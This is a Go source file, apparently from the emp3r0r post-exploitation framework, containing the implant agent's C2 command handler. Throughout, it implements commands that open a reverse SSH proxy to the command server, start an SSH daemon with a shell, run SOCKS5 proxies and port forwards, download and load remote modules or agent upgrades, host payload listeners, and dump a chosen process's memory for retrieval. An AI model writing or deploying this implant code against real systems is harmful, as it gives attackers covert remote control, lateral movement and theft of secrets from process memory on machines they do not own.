package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"strconv"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/listener"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/pflag"
)

func C2CommandsHandler(cmdSlice []string) (out string) {
	var err error

	// parse command-line arguments using pflag
	flags := pflag.NewFlagSet(cmdSlice[0], pflag.ContinueOnError)
	flags.Parse(cmdSlice[1:])

	switch cmdSlice[0] {

	// stat file
	// Usage: !stat --path <path>
	// Retrieves file statistics for the specified path.
	case emp3r0r_data.C2CmdStat:
		path := flags.StringP("path", "p", "", "Path to stat")
		flags.Parse(cmdSlice[1:])
		if *path == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}

		fi, err := os.Stat(*path)
		if err != nil || fi == nil {
			out = fmt.Sprintf("Error: cant stat file %s: %v", *path, err)
			return
		}
		fstat := &util.FileStat{}
		fstat.Name = util.FileBaseName(*path)
		fstat.Size = fi.Size()
		fstat.Checksum = tun.SHA256SumFile(*path)
		fstat.Permission = fi.Mode().String()
		fiData, err := json.Marshal(fstat)
		out = string(fiData)
		if err != nil {
			out = fmt.Sprintf("Error: cant marshal file info %s: %v", *path, err)
		}
		return

	// !bring2cc --addr target_agent_ip
	// Usage: !bring2cc --addr <target_agent_ip>
	// Sets up a reverse proxy to the specified agent IP address.
	// This will forward our SOCKS5 proxy to the target agent's identical port.
	case emp3r0r_data.C2CmdBring2CC:
		addr := flags.StringP("addr", "a", "", "Target agent IP address")
		kcp := flags.StringP("kcp", "k", "off", "Use KCP for reverse proxy")
		flags.Parse(cmdSlice[1:])
		if *addr == "" {
			out = fmt.Sprintf("Error no address: %v", cmdSlice)
			return
		}
		use_kcp := *kcp == "on"

		out = fmt.Sprintf("Bring2CC: Reverse proxy for %s finished", *addr)

		hasInternet := tun.TestConnectivity(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
		isProxyOK := tun.IsProxyOK(RuntimeConfig.C2TransportProxy, emp3r0r_data.CCAddress)
		if !hasInternet && !isProxyOK {
			out = "Error: We don't have any internet to share"
		}
		for p, cancelfunc := range ReverseConns {
			if *addr == p {
				cancelfunc() // cancel existing connection
			}
		}

		targetAddrWithPort := fmt.Sprintf("%s:%s", *addr, RuntimeConfig.ReverseProxyPort)
		ctx, cancel := context.WithCancel(context.Background())

		// start a KCP tunnel to encapsulate the SSH reverse proxy
		kcp_listen_port := fmt.Sprintf("%d", util.RandInt(10000, 60000))
		if use_kcp {
			// kcp will forward to this target address
			targetAddrWithPort = fmt.Sprintf("127.0.0.1:%s", kcp_listen_port)
			kcp_server_addr := fmt.Sprintf("%s:%s", *addr, RuntimeConfig.KCPServerPort)
			go tun.KCPTunClient(kcp_server_addr, kcp_listen_port, RuntimeConfig.Password, emp3r0r_data.MagicString, ctx, cancel)
			util.TakeABlink() // wait for KCP to start
		}
		proxyPort, a2iErr := strconv.Atoi(RuntimeConfig.Emp3r0rProxyServerPort)
		if a2iErr != nil {
			out = fmt.Sprintf("Error: %v", a2iErr)
			cancel()
			return
		}
		if err = tun.SSHReverseProxyClient(targetAddrWithPort, RuntimeConfig.Password,
			proxyPort,
			&ReverseConns,
			emp3r0r_data.ProxyServer,
			ctx, cancel); err != nil {
			out = err.Error()
		}
		return

	// Usage: !sshd --shell <shell> --port <port> --args <args>
	// Starts an SSHD server with the specified shell, port, and arguments.
	case emp3r0r_data.C2CmdSSHD:
		shell := flags.StringP("shell", "s", "", "Shell to use")
		port := flags.StringP("port", "p", "", "Port to use")
		args := flags.StringSliceP("args", "a", []string{}, "Arguments for SSHD")
		flags.Parse(cmdSlice[1:])
		if *shell == "" || *port == "" {
			out = fmt.Sprintf("Error: args error: %s", cmdSlice)
			log.Print(out)
			return
		}
		log.Printf("Got sshd request: %s", cmdSlice)

		errChan := make(chan error)

		go func() {
			errChan <- SSHD(*shell, *port, *args)
		}()

		// wait for SSHD to start
		for !tun.IsPortOpen("127.0.0.1", *port) {
			time.Sleep(100 * time.Millisecond)
		}

		select {
		case err = <-errChan:
			if err != nil {
				out = fmt.Sprintf("Error: %v", err)
			} else {
				out = "success"
			}
		case <-time.After(3 * time.Second):
			out = "SSHD started successfully"
		}
		return

	// !proxy --mode on --addr 0.0.0.0:12345
	// Usage: !proxy --mode <mode> --addr <address>
	// Starts a Socks5 proxy server with the specified mode and address.
	case emp3r0r_data.C2CmdProxy:
		mode := flags.StringP("mode", "m", "", "Proxy mode")
		addr := flags.StringP("addr", "a", "", "Address to bind")
		flags.Parse(cmdSlice[1:])
		if *mode == "" || *addr == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			log.Print(out)
			return
		}
		log.Printf("Got proxy request: %s", cmdSlice)
		err = Socks5Proxy(*mode, *addr)
		if err != nil {
			out = fmt.Sprintf("Error: Failed to start Socks5Proxy: %v", err)
		}
		out = fmt.Sprintf("Socks5Proxy server ready with username %s and password %s",
			RuntimeConfig.ShadowsocksLocalSocksPort,
			RuntimeConfig.Password)
		return

	// !port_fwd --to/listen [to/listen] --shID [shID] --operation/protocol [operation/protocol] --timeout [timeout]
	// Usage: !port_fwd --to <target> --shID <session_id> --operation <operation> --timeout <timeout>
	// Sets up port forwarding with the specified parameters.
	case emp3r0r_data.C2CmdPortFwd:
		to := flags.StringP("to", "t", "", "Target address")
		sessionID := flags.StringP("shID", "s", "", "Session ID")
		operation := flags.StringP("operation", "o", "", "Operation type")
		timeout := flags.IntP("timeout", "T", 0, "Timeout")
		flags.Parse(cmdSlice[1:])
		if *to == "" || *sessionID == "" || *operation == "" {
			out = fmt.Sprintf("Error: Invalid command: %v", cmdSlice)
			return
		}
		out = "success"

		errChan := make(chan error)

		switch *operation {
		case "stop":
			pf, exist := PortFwds[*sessionID]
			if exist {
				pf.Cancel()
				out = fmt.Sprintf("Warning: port mapping %s stopped", pf.Addr)
				break
			}
			out = fmt.Sprintf("Error: port mapping %s not found", pf.Addr)
		case "reverse":
			go func() {
				errChan <- PortFwd(*to, *sessionID, "tcp", true, 0)
			}()
		default:
			go func() {
				errChan <- PortFwd(*to, *sessionID, *operation, false, *timeout)
			}()
		}

		select {
		case err = <-errChan:
			if err != nil {
				out = fmt.Sprintf("Error: %v", err)
			}
		case <-time.After(3 * time.Second):
			out = "Port forwarding started successfully"
		}
		return

	// !delete_portfwd --id id
	// Usage: !delete_portfwd --id <session_id>
	// Deletes the specified port forwarding session.
	case emp3r0r_data.C2CmdDeletePortFwd:
		id := flags.StringP("id", "i", "", "Session ID")
		flags.Parse(cmdSlice[1:])
		if *id == "" {
			return
		}
		for sessionID, session := range PortFwds {
			if sessionID == *id {
				session.Cancel()
			}
		}
		return

	// !utils
	// Usage: !utils --checksum <checksum> --download_addr <download_address>
	// Executes utility functions on the agent.
	case emp3r0r_data.C2CmdUtils:
		checksum := flags.StringP("checksum", "c", "", "Checksum")
		download_addr := flags.StringP("download_addr", "d", "", "Download address from other agents")
		flags.Parse(cmdSlice[1:])
		if *checksum == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		out = VaccineHandler(*download_addr, *checksum)
		if out != "[+] Utils have been successfully installed" {
			out = fmt.Sprintf("Error: %s", out)
		}
		return

	// !custom_module --mod_name mod_name --checksum checksum
	// Usage: !custom_module --mod_name <module_name> --checksum <checksum> --in_mem <in_memory>
	// Loads a custom module with the specified name and checksum.
	case emp3r0r_data.C2CmdCustomModule:
		modName := flags.StringP("mod_name", "m", "", "Module name")
		checksum := flags.StringP("checksum", "c", "", "Checksum")
		inMem := flags.BoolP("in_mem", "i", false, "Load module in memory")
		startscript_checksum := flags.StringP("startscript_checksum", "s", "", "Start script checksum")
		download_addr := flags.StringP("download_addr", "d", "", "Download address from other agents")
		flags.Parse(cmdSlice[1:])
		if *modName == "" || *checksum == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		out = moduleHandler(*download_addr, *modName, *checksum, *startscript_checksum, *inMem)
		return

	// !upgrade_agent --checksum checksum
	// Usage: !upgrade_agent --checksum <checksum>
	// Upgrades the agent with the specified checksum.
	case emp3r0r_data.C2CmdUpdateAgent:
		checksum := flags.StringP("checksum", "c", "", "Checksum")
		flags.Parse(cmdSlice[1:])
		if *checksum == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		out = Upgrade(*checksum)
		return

	// !listener --listener listener --port port --payload payload --compression on/off --passphrase passphrase
	case emp3r0r_data.C2CmdListener:
		listener_type := flags.StringP("listener", "l", "http_aes_compressed", "Listener")
		port := flags.StringP("port", "p", "8000", "Port")
		payload := flags.StringP("payload", "P", "", "Payload")
		compression := flags.StringP("compression", "c", "on", "Compression")
		passphrase := flags.StringP("passphrase", "s", "my_secret_key", "Passphrase")
		flags.Parse(cmdSlice[1:])

		if *payload == "" {
			out = fmt.Sprintf("Error: payload not specified: %v", cmdSlice)
			return
		}
		log.Printf("Got listener request: %v", cmdSlice)

		errChan := make(chan error)

		if *listener_type == "http_aes_compressed" {
			go func() {
				errChan <- listener.HTTPAESCompressedListener(*payload, *port, *passphrase, *compression == "on")
			}()
		}
		if *listener_type == "http_bare" {
			go func() {
				errChan <- listener.HTTPBareListener(*payload, *port)
			}()
		}

		select {
		case err = <-errChan:
			if err != nil {
				out = fmt.Sprintf("Error: %v", err)
			}
		case <-time.After(3 * time.Second):
			out = "Listener started successfully"
		}
		return

	// !file_server --port port
	// this will start a TCP file server with AES_GCM, clients can request arbitrary files at specified offset
	// when this server runs, it will cache files from C2, so that we can serve files to agents
	case emp3r0r_data.C2CmdFileServer:
		port := flags.StringP("port", "p", "8000", "Port")
		server_switch := flags.StringP("switch", "s", "on", "Switch")
		flags.Parse(cmdSlice[1:])
		portInt, err := strconv.Atoi(*port)
		if err != nil {
			out = fmt.Sprintf("Error parsing port: %v", err)
			return
		}
		if *server_switch == "on" {
			out = fmt.Sprintf("File server on port %s is now %s", *port, *server_switch)
			if FileServerCtx != nil {
				FileServerCancel()
			}
			FileServerCtx, FileServerCancel = context.WithCancel(context.Background())
			go FileServer(portInt, FileServerCtx, FileServerCancel)
		} else {
			if FileServerCtx != nil {
				FileServerCancel()
			}
			out = fmt.Sprintf("File server on port %s is now %s", *port, *server_switch)
		}

	case emp3r0r_data.C2CmdFileDownloader:
		// !file_downloader --url <url> --path <path> --checksum <checksum>
		url := flags.StringP("download_addr", "u", "", "URL to download")
		path := flags.StringP("path", "p", "", "Path to save")
		checksum := flags.StringP("checksum", "c", "", "Checksum")
		flags.Parse(cmdSlice[1:])
		if *url == "" || *path == "" {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		download_path := fmt.Sprintf("%s/%s", RuntimeConfig.AgentRoot, util.FileBaseName(*path))
		err = RequestAndDownloadFile(*url, *path, download_path, *checksum)
		if err != nil {
			out = fmt.Sprintf("Error: %v", err)
		} else {
			out = fmt.Sprintf("File downloaded to %s", *path)
		}

	case emp3r0r_data.C2CmdMemDump:
		// !mem_dump --pid <pid> --path <path>
		pid := flags.IntP("pid", "p", 0, "PID of target process")
		flags.Parse(cmdSlice[1:])
		if *pid == 0 {
			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
			return
		}
		outpath := fmt.Sprintf("%s/%d", RuntimeConfig.AgentRoot, *pid)
		err = os.MkdirAll(outpath, 0700)
		if err != nil {
			out = fmt.Sprintf("Error: %v", err)
			return
		}
		dumped_data, err := util.DumpProcMem(*pid)
		if err != nil {
			out = fmt.Sprintf("Error: %v", err)
			return
		}
		for base, data := range dumped_data {
			filePath := fmt.Sprintf("%s/%d_%d.bin", outpath, *pid, base)
			err = os.WriteFile(filePath, data, 0600)
			if err != nil {
				out = fmt.Sprintf("Error: %v", err)
				return
			}
		}
		tarball := fmt.Sprintf("%s/%d.tar.xz", outpath, *pid)
		util.TarXZ(outpath, tarball)
		out = fmt.Sprintf("Memory dumped, please download %s", tarball)

	default:
		// let per-platform C2CommandsHandler do the job
		out = platformC2CommandsHandler(cmdSlice)
	}
	return
}
